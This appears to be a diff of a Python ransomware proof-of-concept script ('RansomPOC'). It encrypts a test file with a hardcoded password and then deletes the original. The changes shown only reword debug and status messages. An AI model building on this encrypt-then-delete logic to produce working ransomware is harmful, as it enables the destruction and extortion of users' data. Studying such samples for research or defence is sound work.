@@ -13,7 +13,6 @@ from Crypto.Random import get_random_bytes
 # Simple Password text
 password = "hello"
 
-
 # Generate random salt
 salt = get_random_bytes(16)
 
@@ -43,10 +42,10 @@ def encrypt_file(file_path, input_key):
 
         # Remove the original file
         remove(file_path)
-        print(f"[+] {file_path} Encrypted successfully => {file_path}.encrypted")
+        print(f"[+] Encryption: Encryption successfully done => {file_path}.encrypted")
 
     except Exception as e:
-        print(f"[-] Encryption Failed! => {file_path}\n[-] Error: {e}")
+        print(f"[-] Encryption: Encryption Failed! => {file_path}\n[-] Error: {e}")
 
 # Step 4: Create Main Script
 if __name__ == "__main__":
@@ -54,21 +53,20 @@ if __name__ == "__main__":
     filePath = r"H:/Repo/RansomPOC/test.docx"
 
     # Debug Print => for filepath to ensure is correct
-    print(f"[*] Debug Info => Submitted filepath is: {filePath}")
+    print(f"[*] Debug Info: Submitted filepath is => {filePath}")
 
     if path.exists(filePath):
-        print(f"[*] Debug Info => Encryption Started for: {filePath}")
+        print(f"[*] Debug Info: Encryption Started for => {filePath}")
         encrypt_file(filePath, key)
     else:
         # Debug Print
-        print(f"[*] Debug Info => File not found: {filePath}")
-        print(f"[*] Debug Info => The absolute filepath is: {path.abspath(filePath)}")
+        print(f"[*] Debug Info: File not found => {filePath}")
+        print(f"[*] Debug Info: The absolute filepath is => {path.abspath(filePath)}")
 
         # Debug Print
         directory, file = path.split(filePath)
-        print(f"[*] Debug Info => Result of Directory Exists: {path.isdir(directory)}")
-        print(f"[*] Debug Info => Result of File Exists: {path.isfile(file)}")
-
+        print(f"[*] Debug Info: Directory Exists Checking => {path.isdir(directory)}")
+        print(f"[*] Debug Info: File Exists Checking => {path.isfile(file)}")
 
 
 
